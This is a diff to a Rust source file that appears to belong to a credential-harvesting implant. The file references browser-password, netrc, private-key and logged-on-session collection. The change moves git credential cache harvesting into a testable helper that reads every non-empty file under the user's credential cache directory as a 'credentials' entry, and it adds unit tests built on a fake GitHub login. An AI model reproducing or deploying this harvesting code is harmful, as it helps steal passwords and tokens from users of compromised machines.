@@ -1715,7 +1715,15 @@ fn collect_browser_passwords(home: &Path, entries: &mut Vec<HarvestEntry>) {
 fn collect_git_credential_cache(entries: &mut Vec<HarvestEntry>) {
     let uid = unsafe { libc::getuid() };
     let cache_dir = PathBuf::from(format!("/run/user/{uid}/git-credential-cache"));
-    let read_dir = match fs::read_dir(&cache_dir) {
+    collect_git_credential_cache_from(&cache_dir, entries);
+}
+
+/// Walk `dir` and collect every non-empty regular file as a `"credentials"` harvest entry.
+///
+/// Extracted from [`collect_git_credential_cache`] so the directory-walk logic can be
+/// unit-tested against a temp directory without depending on `/run/user/<uid>`.
+fn collect_git_credential_cache_from(dir: &Path, entries: &mut Vec<HarvestEntry>) {
+    let read_dir = match fs::read_dir(dir) {
         Ok(rd) => rd,
         Err(_) => return,
     };
@@ -5041,13 +5049,15 @@ mod tests {
     };
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
+    use std::path::Path;
+
     use super::{
         DownloadTransferState, GroupEntry, HarvestEntry, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED,
         MEM_PRIVATE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PendingCallback,
         PhantomState, SessionEntry, UserEntry, collect_browser_passwords,
-        collect_git_credential_cache, collect_netrc, encode_harvest_entries, execute,
-        is_private_key_bytes, parse_group_entries, parse_logged_on_sessions, parse_logged_on_users,
-        parse_memory_region, parse_user_entries,
+        collect_git_credential_cache, collect_git_credential_cache_from, collect_netrc,
+        encode_harvest_entries, execute, is_private_key_bytes, parse_group_entries,
+        parse_logged_on_sessions, parse_logged_on_users, parse_memory_region, parse_user_entries,
     };
     use crate::config::PhantomConfig;
 
@@ -7705,35 +7715,43 @@ mod tests {
         use std::fs;
         use tempfile::TempDir;
 
-        // We cannot easily test the real /run/user/<uid> path, so we test
-        // the helper logic indirectly: create a temp dir, populate it, then
-        // call the underlying read+push logic.  The actual function reads
-        // from a hard-coded path so this validates the entry construction.
         let tmp = TempDir::new().expect("tmpdir");
         let cred_file = tmp.path().join("credential");
         fs::write(&cred_file, b"protocol=https\nhost=github.com\nusername=u\npassword=p\n")
             .expect("write");
 
-        // Simulate the same logic as collect_git_credential_cache
         let mut entries = Vec::new();
-        for entry in fs::read_dir(tmp.path()).expect("readdir").flatten() {
-            let path = entry.path();
-            let meta = entry.metadata().expect("meta");
-            if !meta.is_file() {
-                continue;
-            }
-            let data = fs::read(&path).expect("read");
-            if !data.is_empty() {
-                entries.push(HarvestEntry {
-                    kind: "credentials".to_owned(),
-                    path: path.display().to_string(),
-                    data,
-                });
-            }
-        }
+        collect_git_credential_cache_from(tmp.path(), &mut entries);
 
         assert_eq!(entries.len(), 1);
         assert_eq!(entries[0].kind, "credentials");
         assert!(entries[0].data.starts_with(b"protocol=https"));
+    }
+
+    #[test]
+    fn collect_git_credential_cache_skips_empty_and_dirs() {
+        use std::fs;
+        use tempfile::TempDir;
+
+        let tmp = TempDir::new().expect("tmpdir");
+        // empty file — should be skipped
+        fs::write(tmp.path().join("empty"), b"").expect("write");
+        // subdirectory — should be skipped
+        fs::create_dir(tmp.path().join("subdir")).expect("mkdir");
+
+        let mut entries = Vec::new();
+        collect_git_credential_cache_from(tmp.path(), &mut entries);
+
+        assert!(entries.is_empty());
+    }
+
+    #[test]
+    fn collect_git_credential_cache_missing_dir_is_noop() {
+        let mut entries = Vec::new();
+        collect_git_credential_cache_from(
+            Path::new("/nonexistent/path/git-credential-cache"),
+            &mut entries,
+        );
+        assert!(entries.is_empty());
     }
 }
